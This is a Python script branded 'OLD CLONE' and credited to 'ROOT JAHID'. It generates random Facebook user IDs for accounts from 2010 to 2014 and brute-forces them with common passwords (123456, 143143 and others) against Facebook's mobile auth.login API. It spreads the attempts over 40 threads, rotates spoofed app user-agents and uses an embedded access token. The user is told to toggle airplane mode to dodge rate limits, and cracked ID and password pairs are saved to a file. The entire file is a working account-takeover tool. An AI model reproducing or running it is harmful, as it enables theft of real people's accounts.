# SCRIPT GIFTED BY ROOT JAHID
#----------------------------[IMPORT/MODULE]-----------------------------------#
import requests,bs4,json,os,sys,uuid,random,datetime,time,re
import urllib3,rich,base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os,time,random,json,sys,datetime
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE}-----------------------------------#
def lin():
	print("\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m")
#----------------------------[DATE]-----------------------------------#

#----------------------------[COLOR/CODE]-----------------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#----------------------------[USER/AGENT]-----------------------------------#
def windows():
    A = "[FBAN/MessengerLiteForiOS;FBAV/253.1.0.43.116;FBBV/200174216;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBCR/;FBID/phone;FBLC/en_GB;FBOP/0]"
    B = "[FBAN/Orca-Android;FBAV/431.0.0.0.19;FBPN/com.facebook.orca;FBLC/en_US;FBBV/445200611;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM={density=3.0,width=1080,height=2141};FB_FW/1;]"
    C = "[FBAN/EMA;FBAV/431.0.0.0.19;FBBV/445200616;FBDM={density=4.0,width=1600,height=2560};FBLC/id_ID;FBCR/Robi;FBMF/Xiaomi;FBBD/Pad 5 Pro;FBPN/com.facebook.octa;FBDV/M2105K81C;FBSV/13;FBCA/armeabi-v7a:armeabi;]"
    D = "[FBAN/Orca-Android;FBAV/498.0.0.0.56;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/458607837;FBCR/WIFI;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM={density=3.0,width=1080,height=1920};FB_FW/1;]"
    E = "[FBAN/FB4A;FBAV/408.0.0.29.82;FBBV/389200342;FBCR/Robi;FBMF/OnePlus;FBBD/OnePlus;FBDV/HD1901;FBSV/11;FBCA/arm64-v8a:;FBDM={density=3.0,width=1080,height=2400};FBLC/en_US;FB_FW/1;]"
    F = "[FBAN/MessengerLiteForiOS;FBAV/302.0.0.15.119;FBBV/401223111;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.1;FBSS/3;FBCR/;FBLC/en_GB;FBOP/0]"
    G = "[FBAN/Orca-Android;FBAV/431.0.0.0.19;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/445200622;FBCR/Airtel;FBMF/realme;FBBD/realme;FBDV/RMX3081;FBSV/13;FBCA/arm64-v8a:;FBDM={density=2.75,width=1080,height=2400};FB_FW/1;]"
    H = "[FBAN/FB4A;FBAV/360.0.0.34.116;FBBV/344111220;FBCR/Grameenphone;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 11;FBSV/12;FBCA/arm64-v8a:;FBDM={density=2.5,width=1080,height=2400};FBLC/en_US;FB_FW/1;]"
    I = "[FBAN/MessengerLiteForiOS;FBAV/278.1.0.12.116;FBBV/301222115;FBDV/iPhone11,2;FBMD/iPhone;FBSN/iOS;FBSV/15.6;FBSS/3;FBCR/;FBLC/en_GB;FBOP/0]"
    J = "[FBAN/Orca-Android;FBAV/460.0.0.0.31;FBPN/com.facebook.orca;FBLC/en_US;FBBV/451002211;FBCR/Wifi;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A507FN;FBSV/10;FBCA/arm64-v8a:;FBDM={density=3.0,width=1080,height=2400};FB_FW/1;]"
    K = "[FBAN/EMA;FBAV/431.0.0.0.19;FBBV/445200632;FBDM={density=3.5,width=1440,height=2960};FBLC/id_ID;FBCR/Robi;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.octa;FBDV/CLT-L29;FBSV/12;FBCA/arm64-v8a:armeabi;]"
    L = "[FBAN/FB4A;FBAV/398.0.0.25.119;FBBV/379112211;FBCR/Airtel;FBMF/Realme;FBBD/Realme;FBDV/GT Master;FBSV/12;FBDM={density=2.75,width=1080,height=2400};FBLC/en_US;FB_FW/1;]"
    M = "[FBAN/Orca-Android;FBAV/482.0.0.0.49;FBPN/com.facebook.orca;FBLC/en_IN;FBBV/451203123;FBCR/Jio;FBMF/OnePlus;FBBD/OnePlus;FBDV/OnePlus 8T;FBSV/13;FBDM={density=3.0,width=1080,height=2412};FB_FW/1;]"
    N = "[FBAN/MessengerLiteForiOS;FBAV/310.0.0.16.113;FBBV/405112331;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/17.0;FBSS/3;FBCR/;FBLC/en_GB;FBOP/0]"
    O = "[FBAN/FB4A;FBAV/422.0.0.32.115;FBBV/401331123;FBCR/Robi;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A515F;FBSV/12;FBDM={density=2.5,width=1080,height=2340};FBLC/en_US;FB_FW/1;]"
    P = "[FBAN/Orca-Android;FBAV/490.0.0.0.58;FBPN/com.facebook.orca;FBLC/en_US;FBBV/458600119;FBCR/Wifi;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X6816;FBSV/13;FBDM={density=2.5,width=720,height=1600};FB_FW/1;]"
    Q = "[FBAN/FB4A;FBAV/440.0.0.30.122;FBBV/412009887;FBCR/Airtel;FBMF/Oppo;FBBD/Oppo;FBDV/CPH2237;FBSV/12;FBDM={density=3.0,width=1080,height=2412};FBLC/en_GB;FB_FW/1;]"
    R = "[FBAN/EMA;FBAV/455.0.0.0.90;FBBV/420008111;FBDM={density=3.5,width=1440,height=2960};FBLC/id_ID;FBCR/Telenor;FBMF/Pixel;FBBD/Pixel;FBPN/com.facebook.octa;FBDV/Pixel 6 Pro;FBSV/13;FBCA/arm64-v8a:armeabi;]"
    S = "[FBAN/Orca-Android;FBAV/499.0.0.0.63;FBPN/com.facebook.orca;FBLC/en_US;FBBV/460008887;FBCR/Wifi;FBMF/Samsung;FBBD/Samsung;FBDV/SM-M336B;FBSV/13;FBDM={density=3.0,width=1080,height=2408};FB_FW/1;]"
    T = "[FBAN/FB4A;FBAV/370.0.0.35.112;FBBV/350122888;FBCR/Robi;FBMF/Motorola;FBBD/Motorola;FBDV/Moto G60;FBSV/12;FBDM={density=2.75,width=1080,height=2460};FBLC/en_US;FB_FW/1;]"
    U = "[FBAN/MessengerLiteForiOS;FBAV/315.0.0.14.118;FBBV/410009222;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/17.2;FBSS/3;FBCR/;FBLC/en_GB;FBOP/0]"
    V = "[FBAN/Orca-Android;FBAV/470.0.0.0.27;FBPN/com.facebook.orca;FBLC/en_US;FBBV/453221445;FBCR/Wifi;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A146B;FBSV/13;FBDM={density=2.5,width=1080,height=2460};FB_FW/1;]"

    return random.choice([A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V])
#----------------------------[LOGO]-----------------------------------#
logo = """
\x1b[1;97m
     \x1b[38;5;196m██  \x1b[33;1m█████  \x1b[38;5;46m██   ██ \x1b[34;1m██ \x1b[38;5;196m██████  
     \x1b[38;5;196m██ \x1b[33;1m██   ██ \x1b[38;5;46m██   ██ \x1b[34;1m██ \x1b[38;5;196m██   ██ 
     \x1b[38;5;196m██ \x1b[33;1m███████ \x1b[38;5;46m███████ \x1b[34;1m██ \x1b[38;5;196m██   ██ 
\x1b[38;5;196m██   ██ \x1b[33;1m██   ██ \x1b[38;5;46m██   ██ \x1b[34;1m██ \x1b[38;5;196m██   ██ 
 \x1b[38;5;196m█████  \x1b[33;1m██   ██ \x1b[38;5;46m██   ██ \x1b[34;1m██ \x1b[38;5;196m██████  

\033[0;95m╔════════════════════════════════════════════════════╗
\033[0;95m║ \033[0;94m[!]\033[0;90m\033[1m TOOL OWNER : \033[0;92m\033[1mROOT JAHID                   \033[0;95m     ║
\033[0;95m║ \033[0;94m[!]\033[0;90m\033[1m TOOL NAME  : \033[0;92m\033[1mOLD CLONE                   \033[0;95m      ║
\033[0;95m║ \033[0;94m[!]\033[0;90m\033[1m VERSION    : \033[0;92m\033[1m1.1.1                          \033[0;95m   ║
\033[0;95m║ \033[0;94m[!]\033[0;90m\033[1m TYPE       : \033[0;92m\033[1mFREE                         \033[0;95m     ║
\033[0;95m║ \033[0;94m[!]\033[0;90m\033[1m GITHUB     : \033[0;92m\033[1mROOT JAHID XPLOIT           \033[0;95m      ║
\033[0;95m║ \033[0;94m[!]\033[0;90m\033[1m TELEGRAM   : \033[0;92m\033[1mROOT JAHID                  \033[0;95m      ║
\033[0;95m╚════════════════════════════════════════════════════╝\033[0m"""
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    os.system("clear")
    os.system("xdg-open https://t.me/ROOTJAHIDX")
    os.system("xdg-open https://t.me/ROOTJAHIDX")
    print(logo)
    print(f'\033[1;31m[\033[1;37m=\033[1;31m] \033[1;37mEXAMPLE    \033[1;33m : \033[1;37m5000/10000/99999')
    lin()
    limit=input(f"\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m INPUT \033[1;31m\033[1;37m: ")
    lin()
    os.system('clear')
    print(logo)
    print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37m2010-2014 ')
    lin()
    ask=input(f"\033[1;31m[\033[1;37m?\033[1;31m] INPUT \033[1;37m:\033[1;33m ")
    lin()
    if ask in["1"]:
        newrin="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    with ThreadPool(max_workers=40) as Tx:
        os.system('clear')
        print(logo)
        print(f'\x1b[38;5;196m[\x1b[38;5;46m=\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID : {limit} \x1b[38;5;196m')
        print(f'\x1b[38;5;196m[\x1b[38;5;46m+\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m[\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m]\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        lin()
        for chin in user:
            uid=newrin+chin
            Tx.submit(login,uid)    
loop=0
oks=[]
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mROOT JAHID-FINDING\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            headers = {
    "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),  # integer দিতে হবে
    "x-fb-sim-hni": str(random.randint(20000, 30000)),
    "x-fb-net-hni": str(random.randint(30000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": windows(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r\033[1;30m[\033[1;33mROOT JAHID-OK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/ROOT JAHID-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r\033[1;30m[\033[1;33mROOT JAHID-OK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/ROOT JAHID-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
main()
#----------------------------[END]-----------------------------------#